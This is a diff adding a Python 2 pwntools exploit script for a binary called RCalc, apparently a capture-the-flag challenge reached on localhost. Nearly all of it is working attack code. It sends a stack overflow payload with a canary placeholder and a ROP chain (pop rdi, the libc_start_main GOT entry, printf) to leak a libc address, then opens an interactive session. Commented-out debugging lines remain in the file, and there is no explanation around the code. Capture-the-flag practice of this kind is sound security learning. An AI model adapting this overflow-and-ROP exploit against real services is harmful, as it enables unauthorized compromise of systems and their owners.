@@ -1,0 +1,70 @@
+#!/usr/bin/env python2
+from pwn import *
+from IPython import embed
+
+#p = gdb.debug('./RCalc', 'break *0x400e39')
+#p = process('./RCalc')
+p = remote('127.0.0.1', 7122)
+e = ELF('./RCalc')
+printf = 0x400fc7
+pop_rdi_ret = 0x401123
+dec_ecx_ret = 0x400d21
+got_libc_start_main = 0x601ff0
+#embed()
+#seed = 9977
+#canarya = 664663*449
+#canaryb = 1223*853*149*7
+
+#p.sendline('')
+
+def recv_menu():
+	p.recvuntil('choice:')
+
+def add(a, b, save, menu=True):
+	if menu:
+		recv_menu()
+	p.sendline('1')
+	p.sendline(str(a))
+	p.sendline(str(b))
+	p.recvuntil('is ')
+	n = p.recvline()
+	p.recvuntil('result?')
+	p.sendline(save)
+	return int(n)
+
+def mul(a, b, save, menu=True):
+	if menu:
+		recv_menu()
+	p.sendline('4')
+	p.sendline(str(a))
+	p.sendline(str(b))
+	p.recvuntil('is ')
+	n = p.recvline()
+	p.recvuntil('result?')
+	p.sendline(save)
+	return int(n)
+
+#p.recvuntil('pls:')
+# printf(&printf)
+#p.sendline('a'*264 + p64(0) + 'a'*8 + 'b'*32)
+main = 0x401036
+# name + canary + rbp + ret + argv
+p.sendline('a'*264 + p64(0) + 'a'*8 + flat(pop_rdi_ret, got_libc_start_main, printf, word_size=64) + 'b'*32)
+for i in range(35):
+	add(0, 0, 'yes')
+#p.interactive()
+#add(0, 0, 'yes', False)
+#p.interactive()
+#mul(canarya, canaryb, 'yes', False)
+#p.sendline('break *0x400e39')
+#print hex(printf), p64(printf)
+
+#embed()
+recv_menu()
+p.sendline('5')
+sleep(1)
+embed()
+libc_start_main = u64(p.recvline().ljust(8, '\x00'))
+print hex(libc_start_main), p64(libc_start_main)
+p.interactive()
+#embed()
